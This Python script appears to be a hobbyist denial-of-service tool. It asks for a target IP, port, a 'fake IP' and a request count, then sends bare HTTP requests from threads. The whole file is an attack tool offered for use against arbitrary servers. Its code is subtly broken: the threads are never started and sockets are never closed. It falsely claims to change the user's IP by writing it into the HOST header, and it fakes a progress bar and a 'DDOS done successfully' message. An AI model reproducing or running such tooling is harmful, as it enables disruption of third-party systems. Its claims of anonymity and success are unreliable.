import os
import platform
s = platform.platform()
import webbrowser
from scripts.banner import banner2 , banner , clear

clear()
webbrowser.open("my.html")

try:
    import pyfiglet

except ModuleNotFoundError:
    os.system("pip install pyfiglet")
import threading
from scripts.sprint import sprint
import socket
import time

from scripts.colors import ran , c , lc ,ly , lg , lr , r , y

banner()

def ddos(port=80):
    try:
        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        stream.connect((target, port))
        stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
        stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"), (target, port))
        stream.close

    except KeyboardInterrupt:
        print(f"{lg}Have a Good Day :-)")

    except TimeoutError:
        print(ly + "\nServer timed out!!!!")

    except ConnectionRefusedError:
        print(ran, "You've typed wrong ip address")



no = ["n" , "no"]
yes = ["y" , "yes"]

cont =" "
while cont not in no:

    target = input(ran + "\nEnter Target ip: ")
    try:

        port = int(input(f"{ran}\nEnter port number: "))
    except ValueError:
        port = 80
    else:
        print(f"{ran}\nport {port} is selected! ")

    fake_ip = input(f"{ran}\nType fake ip to hide your identity: "+lg)

    range_of_req = int(input(f"{ran}\nEnter the range of requests: " +lg))

    sprint(lr + "\nWait until all requests are sent" + ("_" * 10))
    ddos(port)
    clear()

    print(pyfiglet.figlet_format("\tAttack\n\tStarting"))
    print(c, "\nChanging Your ip to:", fake_ip)
    print(c, "\nConnecting to port! ")
    for i in range(range_of_req):
        thr = threading.Thread(target=ddos)
        thr.start

    sprint(r+ "[                    ] 0% ")
    time.sleep(1)
    sprint(r+ "[=====               ] 25%")
    time.sleep(2)
    sprint(r+ "[==========          ] 50%")
    time.sleep(1)
    sprint(r+ "[===============     ] 75%")
    time.sleep(2)
    sprint(r+ "[====================] 100%")
    time.sleep(1)

    print(f"{ran}\n\n\r[+]{y} DDOS done successfully! \n\n")

    cont = input(ran + "\nDo you want to continue? [y/n]:" + lc).lower()

    if cont in no:
        clear()
        banner2()

    else:
        clear()
        banner2()


    




